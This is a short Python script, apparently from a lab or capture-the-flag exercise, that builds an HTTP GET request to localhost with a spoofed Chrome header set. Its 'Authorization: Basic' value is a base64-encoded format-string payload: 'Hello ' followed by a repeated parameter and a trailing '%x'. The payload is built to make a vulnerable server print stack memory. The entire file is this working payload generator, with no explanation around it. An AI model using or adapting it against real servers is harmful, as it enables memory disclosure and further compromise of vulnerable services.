

import base64
import sys

arg = sys.argv[1]
param = sys.argv[2]
port = sys.argv[3]

if len(sys.argv) <= 4:
	do_print = False
else:
	do_print = True

starters = f'''
GET / HTTP/1.1
Host: localhost:{port}'''


s = starters + '''
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Authorization: Basic'''

# s = '''
# GET / HTTP/1.1
# Host: localhost:8000
# User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Connection: keep-alive
# Upgrade-Insecure-Requests: 1
# Authorization: Basic'''


message = 'Hello ' + (int(arg) - 1) * (' ' + param + ' ') + ' %x '

if do_print: 
	sys.stderr.write('\n\n' + message + '\n\n')


message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

s += ' ' + base64_message + '\n'
print(s)



